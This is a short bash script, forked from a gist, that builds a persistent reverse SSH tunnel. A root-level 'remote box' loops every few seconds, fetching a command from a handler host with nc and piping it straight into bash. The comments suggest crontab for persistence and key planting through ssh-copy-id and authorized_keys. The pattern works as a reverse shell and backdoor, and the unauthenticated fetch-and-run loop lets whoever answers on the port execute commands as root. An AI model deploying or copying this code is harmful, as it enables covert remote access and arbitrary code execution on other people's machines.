#!/bin/bash
# reverse-ssh.sh
# # Modified by SoMuchCode/YetAnotherCoder
# https://github.com/SoMuchCode
# Forked from: pry0cc/reverse-ssh.sh https://gist.github.com/pry0cc

# Server Setup (listener)
# This computer can be your server, or a publicly accessable server
# If you ssh into the server and run the "./reverse_ssh.ssh -s ..." command
# you will then be connected to the remote box.
# On my server I will set up the handler with
# ./reverse_ssh.ssh -s <my servers external ip> <port> <remote box user>
# ./reverse-ssh.sh -s 192.168.1.9 33333 root

# Remote Box
# You will want this to run all the time and restart at reboot, maybe use crontab
# The syntax works like this.
# ./reverse_ssh.sh -c <ip of handler> <port> <reconnect time in seconds> <server user>
# ./reverse-ssh.sh -c 192.168.1.9 33333 10 pi

# In my example, the server (listener) is at 192.168.1.9, 
# but it could be any address, like: http://yourserver.com
#
# The server is logged in with the user: pi
# And the remote box is logged into the user: root
#
# Therefore, on the remote box we run:
# ./reverse-ssh.sh -c 192.168.1.9 33332 10 pi
#
# And later, at your leisure, run this on the server
# (again, you can SSH into the server from a third box
# and execute this.)
# ./reverse-ssh.sh -s 192.168.1.9 33332 root

# The first time we connect, ssh-copy-id pi@192.168.1.9
# is run from the remote box to exchange the key.

# If we want to autologin we can do the opposite from the server
# once we are connected, copy the server's public key to 
# ~/.ssh/authorized_keys on the remote box.
# nano ~/.ssh/authorized_keys
# and paste in your server's public key.

mode=$1
local_ip=$2
local_port=$3
# user name on server / listener
user=pi
# user name on remote box
remoteuser=root


if [ $mode == "-s" ]; then
	if [ $4 ]; then
		user=$4
		remoteuser=$4
	fi
else
	if [ $5 ]; then
		user=$5
		remoteuser=$5
	fi
fi

function serv_ins {
        echo "ssh -N -R $local_port:localhost:22 $user@$local_ip" | sudo timeout 2 nc -l -p $local_port
}

if [ $mode == "-s" ]
        then
        while [ $(sudo netstat -tupln | grep :$local_port | grep sshd | wc -l) = 0 ]
                do
                        serv_ins
                done
                echo "[*] Connection established"
                echo "[+] Authenticating to reverse_ssh client"
                ssh -p $local_port $remoteuser@localhost
elif [ $mode == "-c" ]
        then
        reconnect_time=$4
        if [ ! -f ~/.ssh/id_rsa.pub ]
                then
                echo "No SSH keypair found... Generating one."
                ssh-keygen
                ssh-copy-id $user@$local_ip
        fi
        echo "Checking for Handler interaction every $reconnect_time seconds"
        while true
        do
                echo "Attempting connection..."
                connect=$(nc $local_ip $local_port)
                echo $connect | bash
                sleep $reconnect_time
        done
fi
exit 0
